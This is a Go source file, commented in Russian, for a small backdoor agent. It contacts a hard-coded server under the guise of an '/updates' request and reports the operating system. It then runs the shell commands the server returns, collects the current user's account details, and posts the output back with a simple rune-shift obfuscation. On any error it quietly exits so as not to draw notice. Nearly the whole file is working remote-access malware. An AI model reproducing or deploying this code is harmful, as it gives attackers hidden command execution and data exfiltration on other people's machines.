package main

import (
	"bytes"
	"encoding/json"
	"io"
	"net/http"
	"os"
	"os/exec"
	"os/user"
	"runtime"
	"strings"
	"time"
)

// КОНСТАНТЫ
const serverAddress string = "192.168.0.126:9292"
const timeout time.Duration = 5 * time.Second
const key string = "super key"

// Ошибка для лентяя
// Стараемся не "шуметь" в случае чего
func ErrorLazy(err error) {
	if err != nil {
		os.Exit(0)
	}
}

// Шифрование исходящих на сервер данных
func EncryptMsg(msg string) (data []byte) {
	msgrune, keyrune := []rune(msg), []rune(key)
	msglen, keylen := len(msgrune), len(keyrune)

	crypt := make([]rune, msglen)

	for j := range msgrune {
		crypt[j] = msgrune[j] + keyrune[j%(keylen)]
	}

	data = []byte(string(crypt))
	return
}

// Расшифровка поступающих с сервера данных
func DecryptMsg(r *http.Response) (msg string) {
	data, err := io.ReadAll(r.Body)
	ErrorLazy(err)

	crypt, keyrune := []rune(string(data)), []rune(key)
	cryptlen, keylen := len(crypt), len(keyrune)

	decmsg := make([]rune, cryptlen)

	for j := range crypt {
		decmsg[j] = crypt[j] - keyrune[j%(keylen)]
	}

	msg = string(decmsg)

	return
}

func main() {
	client := http.Client{
		Transport:     nil,
		CheckRedirect: nil,
		Jar:           nil,
		Timeout:       timeout,
	}

	// Отправка на сервер первого запроса Get с данными о типе OS
	// Получение "сшитого" списка команд
	resp, err := client.Get("http://" + serverAddress + "/updates?os=" + runtime.GOOS)
	ErrorLazy(err)

	// Восстановление массива команд для выполениния
	cmds := strings.Split(DecryptMsg(resp), ";")

	// Выполнение команд
	for i, v := range cmds {

		// Если на сервере нет команд для текущей системы
		if v == "NOTMYCASE" {
			data := EncryptMsg("Oooops... I see you dont know what to do with " + runtime.GOOS + " OS, yeah? Or did something else go wrong?\n")
			_, err = client.Post("http://"+serverAddress, "text", bytes.NewBuffer(data))
			ErrorLazy(err)
		}

		// Исполнение команд из списка
		if i > 1 {
			output := ""

			// Не консольные команды
			if v == "user info" {

				current, err := user.Current()
				ErrorLazy(err)

				data, err := json.Marshal(current)
				ErrorLazy(err)

				output = string(data)

				// Консольные команды
			} else {

				resultCmd := exec.Command(cmds[0], cmds[1], v)
				data, err := resultCmd.Output()
				ErrorLazy(err)

				output = string(data)
			}

			// Отправка данных на сервер
			data := EncryptMsg("---Input Command: " + v + "\n---Output: " + output + "\n")
			_, err = client.Post("http://"+serverAddress, "text", bytes.NewBuffer(data))
			ErrorLazy(err)
		}

	}

	err = resp.Body.Close()
	ErrorLazy(err)

}
